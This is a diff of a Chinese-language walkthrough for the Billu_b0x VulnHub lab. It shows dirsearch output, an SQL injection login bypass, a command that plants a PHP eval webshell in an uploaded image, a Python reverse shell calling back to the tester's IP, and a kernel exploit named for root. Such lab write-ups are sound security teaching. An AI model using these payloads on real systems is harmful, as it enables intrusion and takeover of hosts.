@@ -1,27 +1,25 @@
-
-
-
+[https://www.vulnhub.com/entry/billu-b0x,188/](https://www.vulnhub.com/entry/billu-b0x,188/)
 
 `index.php`提示进行sql注入,但使用万能密码进行初步尝试,返回`Try Again`,推测闭合方式不正确或者存在过滤
 
 `dirsearch`扫描得到的主要路径
 
 ```
-http://192.168.148.9:80/add.php
-http://192.168.148.9:80/c.php
-http://192.168.148.9:80/index.php
-http://192.168.148.9:80/show.php
-http://192.168.148.9:80/test.php
-http://192.168.148.9:80/head.php
-http://192.168.148.9:80/in
-http://192.168.148.9/phpmy
+http://172.20.2.129:80/add.php
+http://172.20.2.129:80/c.php
+http://172.20.2.129:80/index.php
+http://172.20.2.129:80/show.php
+http://172.20.2.129:80/test.php
+http://172.20.2.129:80/head.php
+http://172.20.2.129:80/in
+http://172.20.2.129/phpmy
 ```
 
-`http://192.168.148.9/phpmy`跳转到`phpmyadmin`的登录页面
+`http://172.20.2.129/phpmy`跳转到`phpmyadmin`的登录页面
 
 打开`test.php`提示要向其传递`file`参数,推测其可能为文件包含或文件下载,尝试GET传参失败,使用POST传参成功
 
-![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111011728795.png)
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20211104162735.png)
 
 `index.php`关键内容如下
 
@@ -30,6 +28,12 @@ $uname=str_replace('\'','',urldecode($_POST['un']));
 $pass=str_replace('\'','',urldecode($_POST['ps']));
 $run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
 ```
+
+传入`un= or 1=1#&ps=\`
+
+此时语句为`select * from auth where pass='\' and uname=' or 1=1#'`,pass的内容为`\' and uname=`
+
+成功登录
 
 `in`打开显示为`phpinfo`的内容,`add.php`打开显示存在上传点,但查看源代码后可知其不存在后端
 
@@ -56,19 +60,19 @@ echo "<table width=90% ><tr><td>ID</td><td>User</td><td>Address</td><td>Image</t
 ?>
 ```
 
-![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111011740107.png)
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041631621.png)
 
 `c.php`中含有数据库连接密码`$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");`
 
 尝试利用该密码进行登录和ssh连接均失败,使用该密码成功登录`phpmyadmin`
 
-![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111011829868.png)
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041633211.png)
 
-![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111011832905.png)
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041634143.png)
 
 使用查询得到的用户名和密码成功登录网站
 
-![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111011832695.png)
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041635215.png)
 
 `panel.php`的内容
 
@@ -175,3 +179,37 @@ if(isset($_POST['upload']))
 ```
 
 `include($dir.'/'.$_POST['load']);`存在文件包含,上传一张带有webshell的图片即可
+
+`echo "<?php file_put_contents('uploaded_images/shell.php','<?php eval(\$_POST[a]);?>')?>" >> jack.jpg`
+
+在`uploaded_images/shell.php`中得到一个webshell
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041648724.png)
+
+存在python2的环境,利用python2反弹shell
+
+```py
+import socket
+import subprocess
+import os
+ip="172.20.2.128"
+port=9999
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect((ip,port));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041701182.png)
+
+有时候在使用`nc -lvvp`时会报错`nc: getnameinfo: Temporary failure in name resolution`
+
+此时应该添加`n`参数,即`nc -lvnp`
+
+使用`CVE-2015-1328`进行提权
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041723806.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041725713.png)
